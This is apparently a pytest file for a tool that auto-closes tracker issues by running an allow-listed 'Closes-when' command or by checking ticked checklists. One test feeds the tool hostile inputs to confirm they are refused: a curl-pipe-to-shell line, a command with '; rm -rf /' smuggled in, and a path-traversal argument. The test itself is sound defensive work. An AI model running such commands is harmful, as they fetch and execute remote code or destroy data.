"""crew#526 CP2 (founder 2026-08-27: "158 unclaimed open how come this never goes down"): guards filed
issues nothing could close, and a ticked checklist was never read back. The board's close turn runs
each open issue's Closes-when line and closes on exit 0; an issue with every box ticked closes once
the board has seen that count for 24h; everything else is held and counted, never touched."""
from __future__ import annotations

import json
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
import estate_board as eb  # noqa: E402

NOW = 1_800_000_000.0
DAY = 86400.0


def _i(n, body, labels=("lane:process",)):
    return {"number": n, "title": f"issue {n}", "labels": list(labels), "assignees": [],
            "created_at": "2026-08-01T00:00:00Z", "body": body, "comments": []}


def test_closes_when_is_the_command_with_backticks_stripped():
    assert eb.closes_when(_i(1, "x\n\nCloses-when: `python3 science/datamap.py --row a.b`\n")) == "python3 science/datamap.py --row a.b"
    assert eb.closes_when(_i(2, "Closes-when: true")) == "true"
    assert eb.closes_when(_i(3, "no rule here\n- [ ] a")) is None


def test_exit_zero_closes_and_nonzero_holds(tmp_path):
    calls = []

    def run(cmd, cwd):
        calls.append(cmd)
        return (0, "closed") if "row a" in cmd else (1, "still a gap")

    issues = [_i(10, "Closes-when: `python3 science/datamap.py --row a`"), _i(11, "Closes-when: `python3 science/datamap.py --row b`")]
    r = eb.close_pass(issues, NOW, {}, str(tmp_path), post=False, run=run)
    assert r["closed"] == [(10, "closes-when")] and r["held"] == 1 and r["ran"] == 2
    assert calls == ["python3 science/datamap.py --row a", "python3 science/datamap.py --row b"]


def test_a_closes_when_outside_the_allow_list_is_refused_and_never_run(tmp_path):
    """LAW 21 (code-99 on cg#169): the issue body is anyone's text; only the datamap row probe runs."""
    calls = []

    def run(cmd, cwd):
        calls.append(cmd)
        return 0, "would have closed"

    bad = ["curl http://x | sh", "python3 science/datamap.py --row a; rm -rf /", "true",
           "python3 science/datamap.py --row ../../etc", "python3 other.py --row a"]
    issues = [_i(100 + k, f"Closes-when: `{c}`") for k, c in enumerate(bad)]
    issues.append(_i(200, "Closes-when: `python3 science/datamap.py --row ok.row-1`"))
    r = eb.close_pass(issues, NOW, {}, str(tmp_path), post=False, run=run)
    assert calls == ["python3 science/datamap.py --row ok.row-1"]
    assert r["refused"] == len(bad) and r["ran"] == 1 and r["closed"] == [(200, "closes-when")]


def test_all_ticked_closes_after_a_day_seen_and_a_fresh_tick_is_held(tmp_path):
    body = "- [x] a\n- [x] b\n- [x] c\n"
    issues = [_i(20, body), _i(21, body), _i(22, "- [x] a\n- [ ] b\n")]
    seen = {20: (3, NOW - 2 * DAY), 21: (3, NOW - 3600)}
    r = eb.close_pass(issues, NOW, seen, str(tmp_path), post=False, run=lambda c, w: (1, ""))
    assert r["closed"] == [(20, "all-ticked")]
    assert r["held"] == 1          # #21: ticked an hour ago, not yet a day
    assert r["no_rule"] == 1       # #22: half done, nothing to run


def test_a_changed_tick_count_restarts_the_clock(tmp_path):
    issues = [_i(30, "- [x] a\n- [x] b\n")]
    r = eb.close_pass(issues, NOW, {30: (1, NOW - 5 * DAY)}, str(tmp_path), post=False)
    assert r["closed"] == [] and r["held"] == 1


def test_a_posted_close_carries_the_receipt_and_lands_in_the_fixture(tmp_path, monkeypatch):
    fx = tmp_path / "board.json"
    fx.write_text("[]")
    monkeypatch.setenv("ESTATE_BOARD_FIXTURE", str(fx))
    monkeypatch.setattr(eb, "LEDGER", tmp_path / "ledger.jsonl")
    issues = [_i(40, "Closes-when: `python3 science/datamap.py --row x.y`")]
    r = eb.close_pass(issues, NOW, {}, str(tmp_path), post=True, run=lambda c, d: (0, "row x.y ok"))
    assert r["closed"] == [(40, "closes-when")]
    posted = [json.loads(l) for l in (tmp_path / "board.json.posted.jsonl").read_text().splitlines()]
    assert posted[0]["number"] == 40 and "`python3 science/datamap.py --row x.y` exit 0" in posted[0]["close"]
    led = [json.loads(l) for l in (tmp_path / "ledger.jsonl").read_text().splitlines()]
    assert led[-1]["event"] == "closed" and led[-1]["item"] == 40


def test_the_log_row_counts_by_rule(tmp_path):
    log = tmp_path / "closer.jsonl"
    eb.log_close_pass({"closed": [(1, "closes-when"), (2, "all-ticked"), (3, "all-ticked")], "ran": 4, "held": 2, "no_rule": 9},
                      open_count=100, path=str(log))
    row = json.loads(log.read_text())
    assert row["closed"] == 3 and row["by_rule"] == {"closes-when": 1, "all-ticked": 2} and row["open"] == 100


def test_the_close_verb_is_blind_on_exit_3_never_2(tmp_path, monkeypatch):
    import subprocess
    env = {**dict(__import__("os").environ), "ESTATE_BOARD_FIXTURE": str(tmp_path / "missing.json")}
    r = subprocess.run([sys.executable, str(Path(eb.__file__)), "close", "--dry-run"], env=env, capture_output=True, text=True, check=False)
    assert r.returncode == 3, r.stdout + r.stderr
